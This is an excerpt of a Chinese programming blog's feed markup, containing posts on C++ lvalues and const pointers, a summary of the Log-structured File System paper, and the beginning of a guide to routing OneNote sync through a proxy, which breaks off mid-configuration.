class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">int</span>&amp; ref = <span class="number">10</span>;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; ref &lt;&lt; <span class="string">&quot;\n&quot;</span>;   <span class="comment">// OK!</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; ++ref &lt;&lt; <span class="string">&quot;\n&quot;</span>; <span class="comment">// error: increment of read-only reference ‘ref’</span></span><br></pre></td></tr></table></figure><h2 id="6-Conclusion"><a href="#6-Conclusion" class="headerlink" title="6. Conclusion"></a>6. Conclusion</h2><p>最后一段，不打算翻译。</p><p>Understanding the meaning of lvalues and rvalues has given me the chance to figure out several of the C++’s inner workings. C++11 pushes the limits of rvalues even further, by introducing the concept of rvalue references and move semantics, where — surprise! — rvalues too are modifiable. I will restlessly dive into that minefield in one of my <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW50ZXJuYWxwb2ludGVycy5jb20vcG9zdC9jLXJ2YWx1ZS1yZWZlcmVuY2VzLWFuZC1tb3ZlLXNlbWFudGljcy1iZWdpbm5lcnM=" title="https://www.internalpointers.com/post/c-rvalue-references-and-move-semantics-beginners">next articles<i class="fa fa-external-link"></i></span>.</p><h2 id="Sources"><a href="#Sources" class="headerlink" title="Sources"></a>Sources</h2><p>Thomas Becker’s Homepage - <em>C++ Rvalue References Explained</em> (<span class="exturl" data-url="aHR0cDovL3RoYmVja2VyLm5ldC9hcnRpY2xlcy9ydmFsdWVfcmVmZXJlbmNlcy9zZWN0aW9uXzAxLmh0bWw=" title="http://thbecker.net/articles/rvalue_references/section_01.html">link<i class="fa fa-external-link"></i></span>)<br>Eli Bendersky’s website - <em>Understanding lvalues and rvalues in C and C++</em> (<span class="exturl" data-url="aHR0cDovL2VsaS50aGVncmVlbnBsYWNlLm5ldC8yMDExLzEyLzE1L3VuZGVyc3RhbmRpbmctbHZhbHVlcy1hbmQtcnZhbHVlcy1pbi1jLWFuZC1j" title="http://eli.thegreenplace.net/2011/12/15/understanding-lvalues-and-rvalues-in-c-and-c">link<i class="fa fa-external-link"></i></span>)<br>StackOverflow - <em>Rvalue Reference is Treated as an Lvalue?</em> (<span class="exturl" data-url="aHR0cDovL3N0YWNrb3ZlcmZsb3cuY29tL3F1ZXN0aW9ucy8yODQ4MzI1MC9ydmFsdWUtcmVmZXJlbmNlLWlzLXRyZWF0ZWQtYXMtYW4tbHZhbHVl" title="http://stackoverflow.com/questions/28483250/rvalue-reference-is-treated-as-an-lvalue">link<i class="fa fa-external-link"></i></span>)<br>StackOverflow - <em>Const reference and lvalue</em> (<span class="exturl" data-url="aHR0cDovL3N0YWNrb3ZlcmZsb3cuY29tL3F1ZXN0aW9ucy8yMjg0NTE2Ny9jb25zdC1yZWZlcmVuY2UtYW5kLWx2YWx1ZQ==" title="http://stackoverflow.com/questions/22845167/const-reference-and-lvalue">link<i class="fa fa-external-link"></i></span>)<br>CppReference.com - <em>Reference declaration</em> (<span class="exturl" data-url="aHR0cDovL2VuLmNwcHJlZmVyZW5jZS5jb20vdy9jcHAvbGFuZ3VhZ2UvcmVmZXJlbmNl" title="http://en.cppreference.com/w/cpp/language/reference">link<i class="fa fa-external-link"></i></span>)</p>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>导读-Log-structuredFileSystem</title>
      <link href="/archives/9c2ab089.html"/>
      <url>/archives/9c2ab089.html</url>
      
        <content type="html"><![CDATA[<p>i&gt; 本文转载自：<span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC80MTM1ODAxMw==" title="https://zhuanlan.zhihu.com/p/41358013">https://zhuanlan.zhihu.com/p/41358013<i class="fa fa-external-link"></i></span></p><p>“<span class="exturl" data-url="aHR0cHM6Ly9saW5rLnpoaWh1LmNvbS8/dGFyZ2V0PWh0dHBzOi8vcGVvcGxlLmVlY3MuYmVya2VsZXkuZWR1L35icmV3ZXIvY3MyNjIvTEZTLnBkZg==" title="https://link.zhihu.com/?target=https://people.eecs.berkeley.edu/~brewer/cs262/LFS.pdf">The Design and Implementation of a Log-Structured File System<i class="fa fa-external-link"></i></span>“ 是 Mendel Rosenblum 和 John K. Ousterhout 在90年代初发表的一篇经典论文。且不提论文的两个作者都大名鼎鼎：Rosenblum 是 Vmware 的联合创始人，Ousterhout 是 <span class="exturl" data-url="aHR0cHM6Ly9saW5rLnpoaWh1LmNvbS8/dGFyZ2V0PWh0dHBzOi8vcmFmdC5naXRodWIuaW8vcmFmdC5wZGY=" title="https://link.zhihu.com/?target=https://raft.github.io/raft.pdf">Raft<i class="fa fa-external-link"></i></span>的作者之一（Ongaro 的老板）; 这篇论文在发表之后就引起了长达数年的 <span class="exturl" data-url="aHR0cHM6Ly9saW5rLnpoaWh1LmNvbS8/dGFyZ2V0PWh0dHBzOi8vZW4ud2lraXBlZGlhLm9yZy93aWtpL1VuaXhfRmlsZV9TeXN0ZW0=" title="https://link.zhihu.com/?target=https://en.wikipedia.org/wiki/Unix_File_System">Fast File System<i class="fa fa-external-link"></i></span> 和 LFS 之间的<span class="exturl" data-url="aHR0cHM6Ly9saW5rLnpoaWh1LmNvbS8/dGFyZ2V0PWh0dHA6Ly93d3cuZWVjcy5oYXJ2YXJkLmVkdS9+bWFyZ28vY3MyNjEvcGFwZXItaGlzdG9yeS9zZWNvbmQtc3VibWlzc2lvbi5wZGY=" title="https://link.zhihu.com/?target=http://www.eecs.harvard.edu/~margo/cs261/paper-history/second-submission.pdf">口水战<i class="fa fa-external-link"></i></span>。LFS 在提出后的前10多年里并没有被业界采用（猜猜为什么），但当 SSD 的价格下降并成为主流后，LFS 却焕发了第二春：LFS 被广泛运用在 SSD 的 firmware 中，而且新的文件系统，譬如基于 journal 的 <span class="exturl" data-url="aHR0cHM6Ly9saW5rLnpoaWh1LmNvbS8/dGFyZ2V0PWh0dHBzOi8vZW4ud2lraXBlZGlhLm9yZy93aWtpL0V4dDQ=" title="https://link.zhihu.com/?target=https://en.wikipedia.org/wiki/Ext4">ext3/ext4<i class="fa fa-external-link"></i></span>和支持 copy on write 的 <span class="exturl" data-url="aHR0cHM6Ly9saW5rLnpoaWh1LmNvbS8/dGFyZ2V0PWh0dHBzOi8vZW4ud2lraXBlZGlhLm9yZy93aWtpL0J0cmZz" title="https://link.zhihu.com/?target=https://en.wikipedia.org/wiki/Btrfs">btrfs<i class="fa fa-external-link"></i></span>都吸取了LFS 的 idea；甚至我们常用的<span class="exturl" data-url="aHR0cHM6Ly9saW5rLnpoaWh1LmNvbS8/dGFyZ2V0PWh0dHBzOi8vZW4ud2lraXBlZGlhLm9yZy93aWtpL0xvZy1zdHJ1Y3R1cmVkX21lcmdlLXRyZWU=" title="https://link.zhihu.com/?target=https://en.wikipedia.org/wiki/Log-structured_merge-tree">LSM<i class="fa fa-external-link"></i></span>算法都能看到 LFS 的影子。</p><a id="more"></a><h2 id="动机"><a href="#动机" class="headerlink" title="动机"></a>动机</h2><p>在90年代初，计算机的硬件性能开始了爆发式增长：CPU 的速度越来越快，RAM 也越来越大；然而，虽然硬盘的顺序读写速度也在提高，但是随机读写速度，受制于物理上的寻道时间，却难以短于10ms。另一方面，当时的文件系统不论是 <span class="exturl" data-url="aHR0cHM6Ly9saW5rLnpoaWh1LmNvbS8/dGFyZ2V0PWh0dHBzOi8vZW4ud2lraXBlZGlhLm9yZy93aWtpL1VuaXhfRmlsZV9TeXN0ZW0=" title="https://link.zhihu.com/?target=https://en.wikipedia.org/wiki/Unix_File_System">Unix File System<i class="fa fa-external-link"></i></span> 还是 FFS，都有大量的随机读写（在 FFS 中创建一个新文件至少需要5次随机写），因此成为整个系统的性能瓶颈。同时因为 Page cache 的存在，作者认为随机读不是 主要问题：随着越来越大的内存，大部分的读操作都能被 cache，因此 LFS 主要要解决的是减少对硬盘的随机写操作。</p><h2 id="File-System-as-a-Log"><a href="#File-System-as-a-Log" class="headerlink" title="File System as a Log"></a>File System as a Log</h2><p>那么LFS是怎么减少随机写入呢？它基于一个很简单的 idea: 把整个磁盘看做一个 append only log,永远都是顺序写入。每当我们写入新文件时，我们总是顺序地追加在log 的最后；不同于 FFS/UFS, LFS 对文件的更改并不修改现有内容，而是把增量追加在硬盘的最后。</p><p><img data-src="https://pic2.zhimg.com/80/v2-5a968180f6bc6c9d97617c7ce46956e9_hd.jpg" alt="img"></p><h2 id="管理空余空间：段-Segements"><a href="#管理空余空间：段-Segements" class="headerlink" title="管理空余空间：段(Segements)"></a>管理空余空间：段(Segements)</h2><p>这样的设计有一个明显的问题：硬盘大小是有限的，当我们的 log 把硬盘写满以后，我们就不能再往硬盘里写入新的数据。但是正如图一所示，我们在操作文件系统时，我们会删除文件，或是用新的内容覆盖旧的内容；因此在 log 中会有过期数据。因此我们需要设计垃圾回收机制和空余空间管理机制。</p><p>在 LFS 中，空余空间是用固定大小的段(Segment)来管理的：硬盘被分割成固定大小的段；写操作首先会被写入到内存中；当内存中缓存的数据超过段的大小后，LFS 将数据一次性写入到空闲的段中。</p><p><img data-src="https://pic4.zhimg.com/80/v2-9c4ecd5a9b8c32469e5377c98e7c0c5f_hd.jpg" alt="img"></p><h2 id="LFS-的读操作"><a href="#LFS-的读操作" class="headerlink" title="LFS 的读操作"></a>LFS 的读操作</h2><p>基于段的批量写入解决了随机写入问题，但是LFS 如何实现读操作呢？类似 UFS/FFS, LFS 的在段内存储文件内容时，也存储了文件的索引。具体的来说：</p><ul><li>在 Segment 中，文件内容存储在固定大小的 data block 中</li><li>Segment 中同时存储了 data block 的索引, a.k.a inode. 每个 inode 存储了对应文件的 data block 的索引和 data block 的地址</li></ul><p>在下图的例子中，Segment0 里存储了文件2的两个 data block。而之后的 inode2 中存储了这两个 data block 的索引。</p><p>然而不同于 UFS/FFS, LFS 的 inode 是动态分配的，因此 LFS 在每个 Segment 的尾部存储了对 inode 的索引， 称为 inode map。在 LFS 中，所有的 inode map 内容都会被缓存到内容中，从而加快读取速度。</p><p>  <img data-src="https://pic1.zhimg.com/80/v2-e2d18cf2debe20993e1cebc73ac43bd0_hd.jpg" alt="img"></p><p>有了 inode/inode map 和 data block; 在 LFS 中读取一个inode 号为 i 的文件流程如下:</p><ol><li>从内存中缓存的 inode map 中找到所有的段中 inode 为 i 的地址</li><li>根据不同段中的 inode 找到对应的 data block 地址</li><li>读取 data block 中的数据</li></ol><p>因为 LFS 是 append only，所以对同一个文件的同一个 data block 可能存在多个版本（在不同段中）。但是通过比较不同段的更新时间，LFS就能判断出哪个 segment 中的 data block 是最新版本。</p><h2 id="垃圾回收"><a href="#垃圾回收" class="headerlink" title="垃圾回收"></a>垃圾回收</h2><p>正如前文所说，LFS 需要设计垃圾回收机制来删除旧数据。 在 LFS 中，多个包含过期数据 block 的段（文件内容被更新或是文件被删除）会被 compact 成新的数据段，同时其中的旧数据会被删除。</p><p><img data-src="https://pic4.zhimg.com/80/v2-82171bfc38138a3f6637ab1b7ba4785f_hd.jpg" alt="img"></p><p>但是 LFS 是如何检查段中的过期 block 呢？LFS 在每个段的头部存储了名为 Segment Summary 的数据结构。在 Segment Summary 中存储了段中每个 data block 的地址，和这个 data block 的 inode number （文件号），以及该 block 在文件中的 offset。对于任意 block，只要对比该 block 的地址，和通过 inode map 查询这个 block 的地址是否相同，就能判断这个 block 是否过期。</p><p><img data-src="https://pic4.zhimg.com/80/v2-a2973b1665f092f0e47ed95bd7ca5a3f_hd.jpg" alt="img"></p><h2 id="故障恢复"><a href="#故障恢复" class="headerlink" title="故障恢复"></a>故障恢复</h2><p>显然任何文件系统都要能从故障中恢复数据。不同于 UFS 用 <span class="exturl" data-url="aHR0cHM6Ly9saW5rLnpoaWh1LmNvbS8/dGFyZ2V0PWh0dHBzOi8vZW4ud2lraXBlZGlhLm9yZy93aWtpL0ZzY2s=" title="https://link.zhihu.com/?target=https://en.wikipedia.org/wiki/Fsck">fsck<i class="fa fa-external-link"></i></span> 命令对故障进行恢复，LFS 对整个硬盘存储了 Checkpoint:</p><ul><li>因为 LFS 的每个 Segment 都存储了下一个 Segment 的地址，整个文件系统就像一个链表一样被组织在一起。</li><li>在 Checkpoint 中，LFS 存储了这个链表的第一个 Segment 和最后一个 Segment 的地址，因此只要读取 Checkpoint 就能恢复出整个文件系统。</li><li>LFS 每 30秒更新一次 Checkpoint 中的数据。</li></ul><p><img data-src="https://pic2.zhimg.com/80/v2-c08804c5f9a5c8dd876103c6bfede391_hd.jpg" alt="img"></p><p>现在我们考虑一下系统崩溃的情况：</p><p>如果LFS 在创建 Checkpoint 时崩溃，比如只更新了 Checkpoint 的头指针而没有更新尾指针。对此 LFS 的解决方案是：</p><ul><li>LFS 在硬盘的头部和尾部存储了两个 Checkpoint，每次 Checkpoint 时 LFS 交替地存储在头部或是尾部的 Checkpoint 中。 这样即使写入一个 Checkpoint 失败， LFS 也能恢复到上一个 Checkpoint。</li><li>同时 LFS 利用时间戳来检测 Checkpoint 的失败：在写入 Checkpoint 时，先更新头指针和对应的时间戳，再更新 Checkpoint 中的其它内容，最后更新尾指针和相同的时间戳。如果 LFS 在读取 Checkpoint 时发现头指针和尾指针的时间戳不一致，就知道这个 Checkpoint 并没有完成。</li></ul><p>如果 LFS 在创建 Checkpoint 之间失败，显然系统可以恢复到上一次 Checkpoint 时的状态。然而这会丢失一部分数据。对此 LFS 效仿了数据库的 redo log：LFS 会尝试从当前的 segment 链表尾部恢复出已经成功写入但没有被 Checkpoint 的数据段。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>从今天算起，LFS 已经发布了将近 30 年；然而正式由于作者对未来的正确假设，使得 LFS 的设计思想和理念却仍然深刻地影相了文件系统设计：LFS 的基于 Segment 的设计和 SSD 的物理特性不谋而合，因此被<span class="exturl" data-url="aHR0cHM6Ly9saW5rLnpoaWh1LmNvbS8/dGFyZ2V0PWh0dHBzOi8vbHduLm5ldC9BcnRpY2xlcy8zNTM0MTEv" title="https://link.zhihu.com/?target=https://lwn.net/Articles/353411/">广泛应用在 SSD 的 firmware 中<i class="fa fa-external-link"></i></span>；LSM 的 memory table/compaction 与 LFS 的 memeory buffer 和 GC 一脉相承；而新的文件系统例如 btrfs 也基于 LSM append only 的特点实现了 copy-on-write 或是 multi-version 的特性。  参考文献</p><ol><li><span class="exturl" data-url="aHR0cHM6Ly9saW5rLnpoaWh1LmNvbS8/dGFyZ2V0PWh0dHBzOi8vcGVvcGxlLmVlY3MuYmVya2VsZXkuZWR1L35icmV3ZXIvY3MyNjIvTEZTLnBkZg==" title="https://link.zhihu.com/?target=https://people.eecs.berkeley.edu/~brewer/cs262/LFS.pdf">The Design and Implementation of a Log-Structured File System<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9saW5rLnpoaWh1LmNvbS8/dGFyZ2V0PWh0dHBzOi8vbHduLm5ldC9BcnRpY2xlcy8zNTM0MTEv" title="https://link.zhihu.com/?target=https://lwn.net/Articles/353411/">Log-structured file systems: There’s one in every SSD<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9saW5rLnpoaWh1LmNvbS8/dGFyZ2V0PWh0dHA6Ly93d3cuZWVjcy5oYXJ2YXJkLmVkdS9+Y3MxNjEvbm90ZXMvbGZzLnBkZg==" title="https://link.zhihu.com/?target=http://www.eecs.harvard.edu/~cs161/notes/lfs.pdf">CS 161: Lecture 15<i class="fa fa-external-link"></i></span></li></ol>]]></content>
      
      
      <categories>
          
          <category> 论文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Log-structured FileSystem </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>巧记指针常量和常量指针</title>
      <link href="/archives/e16de5be.html"/>
      <url>/archives/e16de5be.html</url>
      
        <content type="html"><![CDATA[<p>本文中，你可以学习到：</p><ul><li>什么是指针常量和常量指针</li><li>如何巧记两者的区别</li></ul><p>9月，决定以后走c++路线，于是买了c++ primer再看，看到指针常量和常量指针的概念觉得蛮绕的，于是搜了一下巧记两者的方式，特此记录。</p><a id="more"></a><!-- more --><h2 id="0-问题提出"><a href="#0-问题提出" class="headerlink" title="0. 问题提出"></a>0. 问题提出</h2><p>先提出问题吧，问问自己分得清下列几种情况吗？</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> val = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> *p1 = &amp;val;</span><br><span class="line"><span class="keyword">int</span> <span class="keyword">const</span> *p2 = &amp;val;</span><br><span class="line"><span class="keyword">int</span> *<span class="keyword">const</span> p3 = &amp;val;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> *<span class="keyword">const</span> p4 = &amp;val;</span><br><span class="line"><span class="keyword">int</span> <span class="keyword">const</span> *<span class="keyword">const</span> p5 = &amp;val;</span><br></pre></td></tr></table></figure><p>OK，晕了吗？现在让我们来区别它们吧。</p><h2 id="1-指针常量和常量指针"><a href="#1-指针常量和常量指针" class="headerlink" title="1. 指针常量和常量指针"></a>1. 指针常量和常量指针</h2><h3 id="1-1-指针常量"><a href="#1-1-指针常量" class="headerlink" title="1.1 指针常量"></a>1.1 指针常量</h3><p>其实叫指针常量是略有不准确的，准确的说法是“指向常量的指针”。<strong>它不能改变其所指对象的值，但要想存放常量对象的地址，只能使用指向常量的指针。</strong></p><p>eg:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> val = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">int</span> val2 = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">int</span> *p1 = &amp;val;<span class="comment">// error! val是常量，普通指针这样指向是错误的</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> *p2 = &amp;val; <span class="comment">//correct</span></span><br><span class="line">*p2 = <span class="number">0</span>;<span class="comment">// error! p2 指向的是常量，自然也就无法更改对象的值咯</span></span><br><span class="line">p2 = &amp;val2;<span class="comment">//correct p2 本身还是可以指向另一个对象</span></span><br></pre></td></tr></table></figure><h3 id="1-2-常量指针"><a href="#1-2-常量指针" class="headerlink" title="1.2 常量指针"></a>1.2 常量指针</h3><p>指针是一种对象，同其它对象一样，允许把指针本身定为常量。指针常量的特点在于，<strong>一旦完成指针的初始化，那它的值（也就是指针存放的地址）将无法再更改，换言之这类指针无法再指向其它对象。</strong></p><p>eg：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> val = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> val2 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> *<span class="keyword">const</span> p1 = &amp;val;</span><br><span class="line">*p1 = <span class="number">10</span>;<span class="comment">// correct 常量指针是可以通过 * 解引用来赋值的</span></span><br><span class="line">p1 = &amp;val2; <span class="comment">// error! 指针常量完成初始化后就无法再指指向其它对象了</span></span><br></pre></td></tr></table></figure><h3 id="1-3-两者区别"><a href="#1-3-两者区别" class="headerlink" title="1.3 两者区别"></a>1.3 两者区别</h3><p>常量指针和指针常量是互斥的，可以由下表表示</p><table><thead><tr><th align="center"></th><th align="center">是否可更改存放的地址值</th><th align="center">是否可更改指向对象的值</th></tr></thead><tbody><tr><td align="center">指针常量</td><td align="center">Yes</td><td align="center">No</td></tr><tr><td align="center">常量指针</td><td align="center">No</td><td align="center">Yes</td></tr></tbody></table><p>如果一个指针既是指向常量的指针，本身也是个常量指针怎么办？</p><p>eg:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> val = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> *<span class="keyword">const</span> p = &amp;val;</span><br></pre></td></tr></table></figure><p><strong>那它既不可以更改存放的地址值，也不可以更改指向的对象的值。</strong></p><h2 id="2-如何巧记？"><a href="#2-如何巧记？" class="headerlink" title="2. 如何巧记？"></a>2. 如何巧记？</h2><p>看完两者的介绍，难免容易搞混，const一会儿放这儿，一会放那儿的，于是给一个巧记的方法：</p><p>C++ Primer给出了一条法则：</p><blockquote><p>当在阅读一个复合型的变量时，可以把一条语句从右往左来阅读来确定变量的类型。</p></blockquote><p>再结合参考[2]，我们就可以把一条语句展开成英文，进而辅助我们判断。举几个例子：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> *p1 = &amp;val;</span><br></pre></td></tr></table></figure><p>我们从右往左展开，</p><p>p1 is a pointer  (int type) which point to int const</p><p>也就是说p1是一个指针，它指向了一个整数常量。</p><p>又如:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> <span class="keyword">const</span> *p1 = &amp;val;</span><br></pre></td></tr></table></figure><p>p1 is a pointer which point to const int</p><p>p1是一个指针，指向了一个整数常量，也就是和上面的类型相同，注意到const的位置是可以在int左右交换的。</p><p>上面两个例子都是“指针常量”– 指向常量的指针。</p><p>再来，</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> *<span class="keyword">const</span> p1 = &amp;val;</span><br></pre></td></tr></table></figure><p>p1 is a const point which point to int.</p><p>p1是一个常量指针，指向了整数类型。</p><p>最后：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> *<span class="keyword">const</span> p1 = &amp;val;</span><br><span class="line"><span class="keyword">int</span> <span class="keyword">const</span> *<span class="keyword">const</span> p2 = &amp;val;</span><br></pre></td></tr></table></figure><p>p1 is a const pointer which point to int const</p><p>p1 is a const pointer which point to const int</p><p>两个const，即指向常量的常量指针！</p><h2 id="3-Answer"><a href="#3-Answer" class="headerlink" title="3. Answer"></a>3. Answer</h2><p>现在可以对文初提出的问题做一个解答了：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> val = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> *p1 = &amp;val;<span class="comment">// p1 is a pointer point to int const 指针常量</span></span><br><span class="line"><span class="keyword">int</span> <span class="keyword">const</span> *p2 = &amp;val;<span class="comment">// p2 is a pointer point to const int 指针常量</span></span><br><span class="line"><span class="keyword">int</span> *<span class="keyword">const</span> p3 = &amp;val;<span class="comment">// p3 is a const pointer point to int 常量指针</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> *<span class="keyword">const</span> p4 = &amp;val;<span class="comment">// double const </span></span><br><span class="line"><span class="keyword">int</span> <span class="keyword">const</span> *<span class="keyword">const</span> p5 = &amp;val; <span class="comment">// double const</span></span><br></pre></td></tr></table></figure><h2 id="4-额外补充"><a href="#4-额外补充" class="headerlink" title="4. 额外补充"></a>4. 额外补充</h2><p>如果前面3节你已经晕了，那最好就别看这一小节了。</p><p>通过前面3节的说明，相信你已经比较能分清指针常量和常量指针了。可是这里我再给你一个例子，也许会让你有点晕，不过我会慢慢来解释。</p><p>先看例子：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> *pstring;</span><br><span class="line"><span class="keyword">const</span> pstring cstr = <span class="literal">nullptr</span>;</span><br><span class="line">cosnt <span class="keyword">char</span> *pstr = <span class="literal">nullptr</span>;</span><br></pre></td></tr></table></figure><p>现在的问题是 cstr 和 pstr是一个类型吗？它们都是指针常量吗？</p><p>so，答案是，pstr是指针常量，而cstr是一个常量指针。验证的方法，就是直接写个程序看编译器通得过不咯。如下图：</p><p><img data-src="https://ae01.alicdn.com/kf/H2b34a04551584b1ea2862656a42d22deo.jpg"></p><p>可以看在语句<code>*cstr = &amp;val</code>上报错了，也验证了<code>cstr</code>不是一个指针常量。</p><p>其实大部分人都会犯一个错误，那就是将typedef所重定义的数据类型在语句中直接展开，在大部分的场景下是行得通的，但是这里不行。要理解为什么，我们首先需要理解一条声明语句是如何组成的。</p><p>i&gt; 声明语句 = 修饰符 + 基本数据类型 + 声明符列表</p><ul><li>修饰符， 对基本数据类型进行修饰，如const</li><li>基本数据类型， 如int float</li><li>声明符列表，如 * &amp;</li></ul><p>《C++ primer》 中只有 基于数据类型 + 声明符*，我个人觉得把修饰符单独拿出来好理解一点。</p><p>举个例子：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> val = <span class="number">1</span>;<span class="comment">// int 为基本数据类型 val 为声明符</span></span><br><span class="line"><span class="keyword">int</span> *p = &amp;val;  <span class="comment">// int 为基本数据类型 *val 为声明符</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> *ptr = &amp;val; <span class="comment">// const 为修饰符 int为基本数据类型 *ptr 为声明符</span></span><br></pre></td></tr></table></figure><p>好，理解了一条声明语句是如何构成的，就可以分析分析我们的老朋友，指针常量：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> val = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *ptr = &amp;val; <span class="comment">// const 为修饰符 char 为基本数据类型 *ptr 为声明符</span></span><br></pre></td></tr></table></figure><p>以从右往左的原则，*ptr声明符表明 ptr变量为一个指针，而这个指针与基本类型char 相关，最后基本类型char由修饰符const限定，说明char为一个常量。</p><p>那么看看加入typedef后是怎么回事呢？</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> val = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> *pstring;</span><br><span class="line"><span class="keyword">const</span> pstring ptr = &amp;val; <span class="comment">// 得把pstring看为一个整体，那么const 为修饰符, char *为基本数据类型，ptr 为声明符</span></span><br></pre></td></tr></table></figure><p>还是从右往左看，ptr代表变量名，这个变量是一个char <em>的类型，而const则表明它是一个char \</em>型的常量指针。</p><p>i&gt; 不能简单地对typedef进行展开，而应该把重定义的数据类型看成一个整体</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><span class="exturl" data-url="aHR0cHM6Ly9ib29rLmRvdWJhbi5jb20vc3ViamVjdC8yNTcwODMxMi8=" title="https://book.douban.com/subject/25708312/">C++ Primer 中文版（第 5 版)<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lvdXlvdTUxOS9hcnRpY2xlL2RldGFpbHMvODI3MDQ0MDE=" title="https://blog.csdn.net/youyou519/article/details/82704401">指针常量和常量指针的区别和巧记方式<i class="fa fa-external-link"></i></span></li></ul>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 指针 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssr+proxifier+onenote加快你的onenote同步速度</title>
      <link href="/archives/8db8ac8b.html"/>
      <url>/archives/8db8ac8b.html</url>
      
        <content type="html"><![CDATA[<p>从本文中你可以学到：</p><ul><li>如何开启pc的全局代理</li><li>如何开启pc中个别程序的单独代理（玩游戏，onenote同步可使用）<a id="more"></a><h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2>本文所说的onenote，特指onenote2016。onenote uwp版本（即win10上的版本）已不存在同步问题，基本上是秒同步了，但是uwp版本阉割了很多功能,也不知道微软咋想的。。。。</li></ul><p>新学期开始啦，从这学期开始上课都在用ipad做笔记，笔记类应用当然是首推onenote，然而onenote的最大诟病就是他这鸡肋的同步速度，pc与ipad之间的同步总是要等很久才能完成。于是各种百度谷歌，网上的方法差不多有这几种：</p><ol><li><p>注册微软商业用户，每月30不说（现在好像是35了），还得将原来账户上的所有笔记搬到这上面来，有点麻烦，但是效果肯定是最好的。</p></li><li><p>使用酸酸乳，更改user-rule.txt文档（该文件在你的酸酸乳软件的根目录下）为:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">! Put user rules line by line in this file.</span><br><span class="line">! See https:&#x2F;&#x2F;adblockplus.org&#x2F;en&#x2F;filter-cheatsheet</span><br><span class="line">! OneNote Start</span><br><span class="line">.officeapps.live.com</span><br><span 